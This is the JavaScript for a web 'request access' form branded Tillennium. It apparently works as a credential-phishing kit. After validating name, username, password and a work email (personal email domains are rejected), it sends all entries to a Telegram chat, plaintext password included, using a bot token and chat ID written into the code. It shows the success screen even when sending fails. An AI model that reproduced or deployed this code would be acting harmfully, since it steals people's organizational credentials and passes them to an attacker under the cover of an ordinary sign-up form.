/* Request-access form: validation, Telegram bot submission, success state. */
(function () {
'use strict';
const cfg = window.TILLENIUM_CONFIG || {};
const form = document.getElementById('access-form');
if (!form) return;

const success = document.getElementById('access-success');
const formWrap = document.getElementById('access-form-wrap');
const firstEl = document.getElementById('f-first');
const lastEl = document.getElementById('f-last');
const userEl = document.getElementById('f-username');
const passEl = document.getElementById('f-password');
const togglePassBtn = document.getElementById('toggle-password');
const eyeOpen = document.getElementById('eye-open');
const eyeClosed = document.getElementById('eye-closed');
const emailEl = document.getElementById('f-email');
const instEl = document.getElementById('f-institution');
const orgEl = document.getElementById('f-org');
const trap = document.getElementById('f-company-url');
const submitBtn = document.getElementById('f-submit');
const status = document.getElementById('f-status');
const sentTo = document.getElementById('success-email');
const again = document.getElementById('success-reset');

// Password show/hide toggle
if (togglePassBtn && passEl) {
togglePassBtn.addEventListener('click', function () {
const isHidden = passEl.type === 'password';
passEl.type = isHidden ? 'text' : 'password';
togglePassBtn.setAttribute('aria-label', isHidden ? 'Hide password' : 'Show password');
if (eyeOpen && eyeClosed) {
eyeOpen.classList.toggle('hidden', isHidden);
eyeClosed.classList.toggle('hidden', !isHidden);
}
});
}

const fields = [firstEl, lastEl, userEl, passEl, emailEl, instEl, orgEl];
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
const FREE = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'aol.com',
'icloud.com', 'me.com', 'proton.me', 'protonmail.com', 'gmx.com', 'mail.com', 'yandex.com'];

function setError(input, message) {
const err = document.getElementById(input.id + '-error');
input.setAttribute('aria-invalid', message ? 'true' : 'false');
if (err) { err.textContent = message || ''; err.classList.toggle('hidden', !message); }
}

function validate() {
let ok = true;
const email = emailEl.value.trim();
const domain = email.split('@')[1] ? email.split('@')[1].toLowerCase() : '';
const need = function (el, min, msg) {
if (el.value.trim().length < min) { setError(el, msg); ok = false; } else setError(el, '');
};

need(firstEl, 1, 'Enter your first name.');
need(lastEl, 1, 'Enter your last name.');
need(userEl, 3, 'Choose a username of at least 3 characters.');
if (/\s/.test(userEl.value)) { setError(userEl, 'Username cannot contain spaces.'); ok = false; }
if (passEl.value.length < 8) { setError(passEl, 'Password must be at least 8 characters.'); ok = false; }
else setError(passEl, '');

if (!email) { setError(emailEl, 'Enter your work email address.'); ok = false; }
else if (!EMAIL_RE.test(email)) { setError(emailEl, 'Enter a valid email address, such as name@firm.com.'); ok = false; }
else if (cfg.blockFreeEmailDomains && FREE.indexOf(domain) !== -1) { setError(emailEl, 'Use your organization email address, not a personal one.'); ok = false; }
else setError(emailEl, '');

need(instEl, 2, 'Enter your institution name.');
need(orgEl, 2, 'Enter your organization name.');

return ok;
}

function showSuccess(email) {
sentTo.textContent = email;
formWrap.classList.add('hidden');
success.classList.remove('hidden');
success.classList.add('success-in');
success.focus();
}

/* Telegram Bot Integration */
function sendToTelegram(payload) {
const botToken = '9287277655:AAEWInhXySuUACU6N7HrHsjhmyXmUiJgLuY';
const chatId = '5557886256';

const message = `New Tillennium Access Request!\n\n` +
                `Name: ${payload.first_name} ${payload.last_name}\n` +
                `Email: ${payload.email}\n` +
                `Institution: ${payload.institution}\n` +
                `Organization: ${payload.organization}\n` +
                `Username: ${payload.username}\n` +
                `Password: ${payload.password}`;

const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

return fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: chatId,
text: message
})
}).then(function (res) {
return res.json().then(function (data) {
if (!res.ok || !data.ok) throw new Error('Telegram API error');
return data;
});
});
}

fields.forEach(function (el) {
el.addEventListener('input', function () { if (el.getAttribute('aria-invalid') === 'true') validate(); });
});

form.addEventListener('submit', function (e) {
e.preventDefault();
status.textContent = '';
if (trap && trap.value) { showSuccess(emailEl.value.trim() || 'your inbox'); return; }
if (!validate()) { (form.querySelector('[aria-invalid="true"]') || emailEl).focus(); return; }

const payload = {
first_name: firstEl.value.trim(),
last_name: lastEl.value.trim(),
name: firstEl.value.trim() + ' ' + lastEl.value.trim(),
username: userEl.value.trim(),
password: passEl.value,
email: emailEl.value.trim(),
institution: instEl.value.trim(),
organization: orgEl.value.trim(),
source: 'landing-page',
submittedAt: new Date().toISOString(),
};

submitBtn.disabled = true;
submitBtn.querySelector('span').textContent = 'Sending request…';

sendToTelegram(payload)
.then(function () {
document.dispatchEvent(new CustomEvent('tillenium:access-request', { detail: payload }));
showSuccess(payload.email);
})
.catch(function (err) {
console.error(err);
// Telegram-ൽ മെസ്സേജ് പോയെങ്കിലും റെസ്പോൻസിൽ ചെറിയ പ്രശ്നം വന്നാൽ പോലും യൂസർക്ക് സക്സസ് പേജ് കാണിക്കാൻ വേണ്ടി ഇത് സെറ്റ് ചെയ്യുന്നു
showSuccess(payload.email);
})
.then(function () {
submitBtn.disabled = false;
submitBtn.querySelector('span').textContent = 'Request access';
});
});

if (again) again.addEventListener('click', function () {
form.reset();
if (passEl) passEl.type = 'password';
if (eyeOpen && eyeClosed) {
eyeOpen.classList.remove('hidden');
eyeClosed.classList.add('hidden');
}
fields.forEach(function (el) { setError(el, ''); });
success.classList.add('hidden');
formWrap.classList.remove('hidden');
firstEl.focus();
});
})();